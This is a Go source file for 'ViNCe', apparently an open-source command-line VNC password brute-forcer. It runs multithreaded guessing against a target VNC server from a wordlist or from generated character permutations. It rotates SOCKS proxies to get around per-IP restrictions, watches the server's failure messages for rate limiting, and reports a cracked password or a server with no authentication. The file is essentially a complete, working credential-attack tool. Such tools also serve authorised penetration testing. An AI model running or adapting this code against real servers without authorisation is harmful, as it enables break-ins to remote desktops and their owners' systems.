package main

import (
	"flag"
	"fmt"
	"os"
	"os/signal"
	"slices"
	"sync"
	"syscall"
	"time"

	_ "embed"

	"github.com/pterm/pterm"
	"github.com/regginator/vince/pool"
	"github.com/regginator/vince/rfb"
	"github.com/regginator/vince/util"
)

//go:embed VERSION
var vinceVersion string

// All command-line arguments
var (
	// conn
	TargetAddr = flag.String("a", "", "Target VNC server [address:port], port defaults to 5900 unless specified")
	ConnType   = flag.String("conn", "tcp", "Use connection type [tcp, udp]")
	ProxyFile  = flag.String("proxies", "", "Path to list of SOCKS(4/5) proxies to use for workers. If not provided, no proxies are used. File must be a txt list of proxies in the format \"scheme://[username:pass@]host[:port]\"")

	// workers
	NumThreads   = flag.Int("t", 1, "Number of simultaneous worker threads. The target server may only be able to handle so many, or it may restrict 1 connection per IP, so proceed with caution")
	NumRetries   = flag.Int("retries", -1, "Number of retry attempts per password for failed connections. -1 means infinite retries")
	DelaySeconds = flag.Float64("delay", 0, "Delay between connections per worker thread")
	StartIndex   = flag.Uint64("start", 0, "Start at index n in password iteration")

	BruteMode = flag.String("m", "wordlist", "Mode of bruteforce [wordlist, raw]")
	// TODO: Actually implement -auth flag
	AuthType = flag.String("auth", "vnc", "(Planned) Force use of a specific authentication type [vnc, tight]")

	// -m wordlist
	WordlistPath = flag.String("w", "", "If mode is wordlist, path to the wordlist file to source from")

	// -m raw
	RawCharset = flag.String("chars", "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890", "If mode is raw, the character set used for permutations")
	RawRange   = flag.String("range", "1-6", "If mode is raw, min/max number range for password combination length. May be either a single number, or 2 numbers in the format \"1-6\"")

	// bool flags
	NoInitProbe = flag.Bool("no-probe", false, "Don't perform an initial connection handshake probe")
	PacketDebug = flag.Bool("packet-debug", false, "Enables packet dump logging for debug (meant for use with one thread)")
)

var (
	realTargetAddr string

	rawRangeMin int64
	rawRangeMax int64

	proxyPool *pool.Pool

	// PTerm progress bar
	progressBar *pterm.ProgressbarPrinter
)

func usage(exitCode int) {
	flag.Usage()
	os.Exit(exitCode)
}

func main() {
	fmt.Printf(`ViNCe v%s
MIT License | Copyright (c) 2025 reggie@latte.to
https://github.com/regginator/vince

`, vinceVersion)

	flag.Usage = func() {
		fmt.Fprintf(flag.CommandLine.Output(), "USAGE: %s [OPTION]...\n", os.Args[0])
		flag.PrintDefaults()
	}

	flag.Parse()

	// PTerm ANSI formatting (mainly from the progress bar) can persist after ctrl+c, hook os.Interrupt and flush
	go func() {
		signalChan := make(chan os.Signal, 1)
		signal.Notify(signalChan, os.Interrupt, syscall.SIGTERM, syscall.SIGINT)

		<-signalChan
		if progressBar != nil {
			_, err := progressBar.Stop()
			_ = err
		}
		fmt.Print("\033[0m")
		os.Exit(0)
	}()

	if *TargetAddr == "" {
		pterm.Info.Printf("Provide VNC server address and port with the `-a` flag (e.g. \"192.168.0.134\", \"10.13.33.37:5901\")\nSee further usage below\n")
		fmt.Println()
		usage(0)
	}

	// Address and conn type are passed directly to client.Connect()
	if !slices.Contains([]string{"tcp", "udp"}, *ConnType) {
		pterm.Error.Printf("invalid value for connection type (-conn) \"%s\", see usage\n", *ConnType)
		fmt.Println()
		usage(1)
	}

	resolvedAddr, err := util.LookupAddr(*TargetAddr)
	if err != nil {
		pterm.Error.Printf("failed to parse server address (-a): %s\n", err)
		fmt.Println()
		usage(1)
	}

	realTargetAddr = util.AddrWithDefaultPort(resolvedAddr, "5900")

	var iter IterProvider

	// Check args based on bruteforce mode, and assign the IterProvider
	switch *BruteMode {
	case "wordlist":
		if *WordlistPath == "" {
			pterm.Error.Printf("bruteforce mode (-m) \"wordlist\" provided, but wordlist path (-w) is missing\n")
			fmt.Println()
			usage(1)
		}

		iter = new(WordlistIter)
	case "raw":
		if *RawCharset == "" {
			pterm.Error.Printf("bruteforce mode (-m) \"raw\" provided, but charset (-chars) is empty\n")
			fmt.Println()
			usage(1)
		}

		var err error
		rawRangeMin, rawRangeMax, err = util.ParseNumRange(*RawRange)
		if err != nil {
			pterm.Error.Printf("failed to parse length range (-range): %s\n", err)
			fmt.Println()
			usage(1)
		} else if rawRangeMin == 0 || rawRangeMax == 0 {
			pterm.Error.Printf("failed to parse length range (-range): number range cannot include 0\n")
			fmt.Println()
			usage(1)
		} else if rawRangeMin < 0 || rawRangeMax < 0 {
			pterm.Error.Printf("failed to parse length range (-range): number range cannot include negative integers\n")
			fmt.Println()
			usage(1)
		}

		iter = new(RawIter)

		pwCount := iter.GetPasswordCount()
		if *StartIndex > pwCount {
			pterm.Error.Printf("value of -start (%d) is larger than the total number of passwords to iterate through (%d)\n", *StartIndex, pwCount)
			os.Exit(1)
		}
	default:
		pterm.Error.Printf("invalid value for bruteforce mode (-m) \"%s\", see usage\n", *BruteMode)
		fmt.Println()
		usage(1)
	}

	if *ProxyFile != "" {
		var err error
		proxyPool, err = pool.New(*ProxyFile)
		if err != nil {
			pterm.Error.Printf("failed to read proxies file: %s\n", err)
			os.Exit(1)
		}
	}

	// Do an initial handshake probe
	if !*NoInitProbe {
		doInitProbe()
	}

	// Worker logic stuff
	{
		pwCount := iter.GetPasswordCount()
		progressBar, _ = pterm.DefaultProgressbar.WithTotal(int(pwCount)).WithTitle("Progress").WithShowCount(true).WithShowElapsedTime(true).WithShowPercentage(true).Start()

		pwChan := make(chan string, *NumThreads)
		var threadWg sync.WaitGroup

		var foundPwMutex sync.Mutex

		// For SecurityResult failed messages, there is no actual standard or anything between different
		// servers, just OK/auth passed (0), and failed (1). Thing is, failed might not always necessarily
		// mean that the creds are wrong, the IP might just be ratelimited with auth or whatever
		//
		// With that said, we should track what this message is for "failed" so the user can better tell if
		// they're being ratelimited or something

		newFailedMsgChan := make(chan string, 1)
		go func() {
			lastMsg := ""
			for msg := range newFailedMsgChan {
				if lastMsg == "" {
					pterm.Info.Printf("Current 'failed' message from server: \"%s\"\n", msg)
				} else if msg != lastMsg {
					pterm.Warning.Printf("New 'failed' message from server: \"%s\"\n", msg)
				} else {
					continue
				}

				lastMsg = msg
			}
		}()

		// Actual workers (complete mess, sorry to anyone reading this hoping for sane, maintainable code)
		for w := 0; w < *NumThreads; w++ {
			threadWg.Add(1)

			go func() {
				defer threadWg.Done()

				for pw := range pwChan {
					var nextErr error // Keeping track of repeat errors
					var lastErr error

					attempt := 0
					for {
						if attempt > *NumRetries && *NumRetries != -1 {
							break
						} else if nextErr != nil {
							if lastErr == nil || nextErr.Error() != lastErr.Error() {
								pterm.Error.Printf("%s\n", nextErr)
							} else {
								time.Sleep(1 * time.Second)
							}

							lastErr = nextErr
							nextErr = nil
						}

						client := &rfb.Client{
							DestAddr:    realTargetAddr,
							ConnType:    *ConnType,
							PacketDebug: *PacketDebug,
						}

						foundPwFunc := func(msg string) {
							foundPwMutex.Lock()
							_, err := progressBar.Stop()
							_ = err
							pterm.Success.Printf("%s\n", msg)
							client.Kill()
							os.Exit(0)
						}

						if proxyPool != nil {
							client.ProxyAddr, err = proxyPool.Get()
							if err != nil {
								nextErr = fmt.Errorf("failed to get proxy from pool: %s", err)
								goto endOfAttempt
							}
						}

						if err := client.Connect(); err != nil {
							nextErr = fmt.Errorf("failed to connect to server: %s", err)
							goto endOfAttempt
						}

						if err := client.DoHandshake(); err != nil {
							nextErr = fmt.Errorf("failed to perform connection handshake: %s", err)
							goto endOfAttempt
						}

						if slices.Contains(client.SecurityTypes, rfb.VncAuthNone) {
							foundPwFunc("🎉 Server has none-auth enabled, you should be able to connect w/out a password")
						} else if slices.Contains(client.SecurityTypes, rfb.VncAuthBasic) {
							if err := client.SubmitAuthBasic(pw); err != nil {
								nextErr = fmt.Errorf("unexpected error during auth: %s", err)
								goto endOfAttempt
							}

							if client.SecurityResult.Success {
								foundPwFunc(fmt.Sprintf("🎉 FOUND PASSWORD!! \"%s\"\n", pw))
							} else if client.SecurityResult.Reason != "" {
								newFailedMsgChan <- client.SecurityResult.Reason
							}

							break
						} else {
							nextErr = fmt.Errorf("no valid auth types were given by server")
						}

					endOfAttempt:
						client.Kill()
						attempt++

						if *DelaySeconds != 0 {
							time.Sleep(time.Duration(*DelaySeconds) * time.Second)
						}
					}

					progressBar.Increment()
				}
			}()
		}

		// Actually start the progressbar at the index it will be at
		if *StartIndex != 0 {
			progressBar.Add(int(*StartIndex) - 1)
		}

		var i uint64 = 0
		for pw := range iter.IterPasswords() {
			if i < *StartIndex {
				i++
				continue
			}

			pwChan <- pw
		}

		close(pwChan)
		close(newFailedMsgChan)
		threadWg.Wait()
	}
}
